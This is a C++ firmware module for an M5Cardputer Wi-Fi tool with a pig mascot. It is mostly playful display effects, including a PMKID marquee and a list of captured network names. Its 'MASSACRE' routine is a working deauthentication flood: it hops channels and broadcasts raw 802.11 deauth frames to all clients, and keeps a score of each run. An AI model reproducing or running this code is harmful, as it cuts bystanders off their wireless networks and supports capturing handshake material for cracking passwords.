#include "cursed.h"
#include "xp.h"
#include "config.h"
#include "sdlog.h"
#include <M5Cardputer.h>
#include <esp_wifi.h>
#include "../ui/display.h"
#include "../piglet/avatar.h"
#include "../piglet/mood.h"

// RTC data definitions
RTC_DATA_ATTR uint16_t cursed_massacreCount = 0;
RTC_DATA_ATTR SeanceGhost cursed_ghosts[SEANCE_GHOST_COUNT] = {};
RTC_DATA_ATTR uint8_t cursed_ghostWriteIndex = 0;
RTC_DATA_ATTR uint8_t cursed_ghostCount = 0;

// ---- 1. MASSACRE ----
static bool massacreActive = false;
static uint32_t massacreStartMs = 0;
static uint8_t massacreChannelIdx = 0;
static uint32_t massacreLastHop = 0;

void cursed_massacreBegin() {
    if (massacreActive) return;
    massacreActive = true;
    massacreStartMs = millis();
    massacreChannelIdx = 0;
    massacreLastHop = 0;
    Display::setBottomOverlay("MASSACRE");
    Display::setLED(255, 0, 0);
    SDLog::log("CURSED", "Massacre begun. Score: %u", cursed_massacreCount);
}

void cursed_massacreUpdate() {
    if (!massacreActive) return;
    uint32_t now = millis();
    if (now - massacreStartMs >= 3000) {
        massacreActive = false;
        cursed_massacreCount++;
        Display::clearBottomOverlay();
        Display::setLED(0, 0, 0);
        M5.Display.fillScreen(TFT_BLACK);
        M5.Display.setTextColor(TFT_RED);
        M5.Display.setTextSize(2);
        M5.Display.drawCentreString("MASSACRE", 120, 35, 1);
        char buf[32];
        snprintf(buf, sizeof(buf), "SCORE: %u", cursed_massacreCount);
        M5.Display.drawCentreString(buf, 120, 60, 1);
        M5.Display.drawCentreString("THE PIG IS PLEASED", 120, 85, 1);
        M5.Display.display();
        delay(1500);
        cursed_usbBeepOnEvent("MASSACRE COMPLETE");
        SDLog::log("CURSED", "Massacre #%u complete", cursed_massacreCount);
        return;
    }
    if (now - massacreLastHop >= 25) {
        static const uint8_t channels[] = {1,6,11,2,7,3,8,4,9,5,10,12,13};
        massacreChannelIdx = (massacreChannelIdx + 1) % 13;
        esp_wifi_set_channel(channels[massacreChannelIdx], WIFI_SECOND_CHAN_NONE);
        uint8_t deauth[26] = {
            0xC0,0x00,0x00,0x00,
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0x00,0x00,0x01,0x00
        };
        for (int i = 0; i < 8; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
            delayMicroseconds(200);
        }
        massacreLastHop = now;
    }
}

bool cursed_massacreIsActive() { return massacreActive; }
uint16_t cursed_massacreGetCount() { return cursed_massacreCount; }

// ---- 2. BSSID SEANCE ----
void cursed_ghostRecord(const uint8_t* bssid, const char* ssid) {
    uint8_t idx = cursed_ghostWriteIndex;
    memcpy(cursed_ghosts[idx].bssid, bssid, 6);
    strncpy(cursed_ghosts[idx].ssid, ssid ? ssid : "UNKNOWN", 32);
    cursed_ghosts[idx].ssid[32] = 0;
    cursed_ghosts[idx].timestamp = millis();
    cursed_ghostWriteIndex = (idx + 1) % SEANCE_GHOST_COUNT;
    if (cursed_ghostCount < SEANCE_GHOST_COUNT) cursed_ghostCount++;
}

static bool seanceActive = false;
static uint32_t seanceStartMs = 0;
static uint8_t seanceGhostIdx = 0;

void cursed_seanceBegin() {
    if (cursed_ghostCount == 0) {
        Display::showToast("NO GHOSTS", 2000);
        return;
    }
    seanceActive = true;
    seanceStartMs = millis();
    seanceGhostIdx = random(0, cursed_ghostCount);
    Display::setTopBarMessage("CHANNELING...", 5000);
    Serial.printf("[SEANCE] Channeling ghost %u/%u\n", seanceGhostIdx, cursed_ghostCount);
}

bool cursed_seanceIsActive() { return seanceActive; }

void cursed_seanceUpdate() {
    if (!seanceActive) return;
    uint32_t now = millis();
    uint32_t elapsed = now - seanceStartMs;
    if (elapsed < 2000) {
        Display::setLED((elapsed / 100) % 2 ? 128 : 0, 0, (elapsed / 100) % 2 ? 0 : 128);
        if ((elapsed / 300) % 2 == 0) Serial.write('\a');
    } else if (elapsed < 6000) {
        M5Canvas& main = Display::getMain();
        main.fillSprite(COLOR_BG);
        main.setTextColor(TFT_PURPLE);
        main.setTextSize(1);
        main.drawCentreString("=== BSSID SEANCE ===", 120, 10, 1);
        main.drawString("THE PAST SPEAKS:", 10, 30, 1);
        SeanceGhost& g = cursed_ghosts[seanceGhostIdx];
        char line[40];
        snprintf(line, sizeof(line), "\"%s\"", g.ssid);
        main.drawCentreString(line, 120, 50, 1);
        snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X",
                 g.bssid[0],g.bssid[1],g.bssid[2],g.bssid[3],g.bssid[4],g.bssid[5]);
        main.drawCentreString(line, 120, 65, 1);
        uint32_t ageS = (now - g.timestamp) / 1000;
        if (ageS > 86400) snprintf(line, sizeof(line), "DECEASED %lud AGO", ageS/86400);
        else if (ageS > 3600) snprintf(line, sizeof(line), "DECEASED %luh AGO", ageS/3600);
        else snprintf(line, sizeof(line), "DECEASED %lus AGO", ageS);
        main.drawCentreString(line, 120, 80, 1);
        main.drawCentreString("PRESS ENTER TO DISMISS", 120, 105, 1);
        Display::pushAll();
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            seanceActive = false;
            Display::clearTopBarMessage();
            Display::setLED(0, 0, 0);
        }
    } else {
        seanceActive = false;
        Display::clearTopBarMessage();
        Display::setLED(0, 0, 0);
    }
}

// ---- 3. PMKID MARQUEE ----
static char marqueeBuf[80] = {0};
static uint32_t marqueeStartMs = 0;
static uint8_t marqueeOffset = 0;
static uint32_t marqueeLastShift = 0;

void cursed_pmkidMarqueeSet(const uint8_t* pmkid, const char* ssid) {
    if (!pmkid) return;
    char hex[33];
    for (int i = 0; i < 16; i++) snprintf(hex+(i*2), 3, "%02X", pmkid[i]);
    hex[32] = 0;
    snprintf(marqueeBuf, sizeof(marqueeBuf), " PMKID: %s [%s] ", hex, ssid ? ssid : "?");
    marqueeOffset = 0;
    marqueeStartMs = millis();
    marqueeLastShift = 0;
}

void cursed_pmkidMarqueeDraw(M5Canvas& canvas, int16_t y, uint16_t fg, uint16_t bg) {
    if (marqueeBuf[0] == 0) return;
    if (millis() - marqueeStartMs > 10000) { marqueeBuf[0] = 0; return; }
    if (millis() - marqueeLastShift >= 120) {
        marqueeOffset = (marqueeOffset + 1) % strlen(marqueeBuf);
        marqueeLastShift = millis();
    }
    char disp[22];
    int l = strlen(marqueeBuf);
    for (int i = 0; i < 21 && i < l; i++) disp[i] = marqueeBuf[(marqueeOffset+i)%l];
    disp[21] = 0;
    canvas.setTextColor(TFT_GREEN, bg);
    canvas.setTextSize(1);
    canvas.drawCentreString(disp, 120, y, 1);
}

// ---- 4. PIG JUMPSCARE ----
static bool jumpscareActive = false;
static uint32_t jumpscareStartMs = 0;

void cursed_jumpscareTrigger() {
    jumpscareActive = true;
    jumpscareStartMs = millis();
    Display::setLED(255, 0, 0);
    M5.Display.fillScreen(TFT_WHITE);
    M5.Display.setTextColor(TFT_RED);
    M5.Display.setTextSize(3);
    M5.Display.drawCentreString("PORKCHOP", 120, 25, 1);
    M5.Display.drawCentreString("UNLEASHED", 120, 55, 1);
    M5.Display.drawCentreString("PMKID", 120, 85, 1);
    M5.Display.display();
    for (int i = 0; i < 5; i++) { Serial.write('\a'); delay(30); }
}

bool cursed_jumpscareIsActive() { return jumpscareActive; }

void cursed_jumpscareUpdate() {
    if (!jumpscareActive) return;
    if (millis() - jumpscareStartMs >= 300) {
        jumpscareActive = false;
        Display::setLED(0, 0, 0);
        Display::clear();
    }
}

// ---- 5. SHUTDOWN RITUAL ----
static bool shutdownActive = false;
static uint32_t shutdownStartMs = 0;
static bool shutdownDone = false;

void cursed_shutdownRitual() {
    shutdownActive = true;
    shutdownStartMs = millis();
    shutdownDone = false;
    M5.Display.fillScreen(COLOR_BG);
}

bool cursed_shutdownIsActive() { return shutdownActive; }
bool cursed_shutdownIsDone() { return shutdownDone; }

void cursed_shutdownUpdate() {
    if (!shutdownActive) return;
    uint32_t elapsed = millis() - shutdownStartMs;
    M5Canvas& main = Display::getMain();

    if (elapsed < 1500) {
        main.fillSprite(COLOR_BG);
        main.setTextColor(COLOR_FG);
        main.setTextSize(1);
        const char* l1 = "you're leaving? again? fine.";
        int c1 = (elapsed / 40);
        if (c1 > (int)strlen(l1)) c1 = strlen(l1);
        char buf[40];
        strncpy(buf, l1, c1); buf[c1] = 0;
        main.drawString(buf, 20, 15, 1);
        if (elapsed > 600) {
            const char* l2 = "i'll be here. counting.";
            int c2 = ((elapsed-600)/40);
            if (c2 > (int)strlen(l2)) c2 = strlen(l2);
            strncpy(buf, l2, c2); buf[c2] = 0;
            main.drawString(buf, 20, 35, 1);
        }
        Display::pushAll();
        uint8_t r = 64 + (elapsed * 64 / 1500);
        Display::setLED(r, 0, 0);
    } else if (elapsed < 3500) {
        main.fillSprite(COLOR_BG);
        Avatar::setState(AvatarState::SAD);
        Avatar::setMoodIntensity(-100);
        Avatar::draw(main);
        main.setTextColor(COLOR_FG);
        main.setTextSize(1);
        main.drawString("hope the networks", 60, 10, 1);
        main.drawString("miss you as much as i do.", 60, 25, 1);
        main.drawString("-- pig.", 60, 55, 1);
        Display::pushAll();
        uint8_t r = 128 - ((elapsed-1500)*128/2000);
        Display::setLED(r, 0, 0);
    } else {
        shutdownActive = false;
        shutdownDone = true;
        Display::setLED(0, 0, 0);
        Serial.println("[CURSED] Shutdown ritual complete");
    }
}

// ---- 6. USB HAPTIC ----
void cursed_usbBeep() { Serial.write('\a'); }
void cursed_usbBeepOnEvent(const char* eventName) {
    Serial.write('\a'); delay(20);
    Serial.write('\a'); delay(20);
    Serial.print("[!] "); Serial.println(eventName);
}

// ---- 7. PIG BODY HORROR ----
uint8_t cursed_getCorruptionLevel() {
    uint8_t lv = XP::getLevel();
    if (lv >= 46) return 255;
    if (lv >= 36) return 170;
    if (lv >= 26) return 100;
    if (lv >= 16) return 50;
    if (lv >= 11) return 20;
    return 0;
}

void cursed_corruptBuffer(uint8_t* buffer, size_t len, uint8_t level) {
    if (!buffer || len == 0 || level == 0) return;
    uint8_t flips = 1 + (level / 64);
    if (flips > 6) flips = 6;
    for (uint8_t f = 0; f < flips; f++) {
        if (random(0, 255) < level) {
            size_t idx = random(0, len);
            buffer[idx] ^= (1 << random(0, 8));
        }
    }
}

// ---- INIT & UPDATE ----
void cursed_init() {
    Serial.printf("[CURSED] init: massacre=%u ghosts=%u\n",
                  cursed_massacreCount, cursed_ghostCount);
    if (cursed_ghostCount > 0) {
        Serial.println("[CURSED] Previous ghosts:");
        for (uint8_t i = 0; i < cursed_ghostCount; i++) {
            Serial.printf("  [%u] %s\n", i, cursed_ghosts[i].ssid);
        }
    }
}

void cursed_update() {
    if (massacreActive) cursed_massacreUpdate();
    if (seanceActive) cursed_seanceUpdate();
    if (jumpscareActive) cursed_jumpscareUpdate();
    if (shutdownActive) cursed_shutdownUpdate();
}

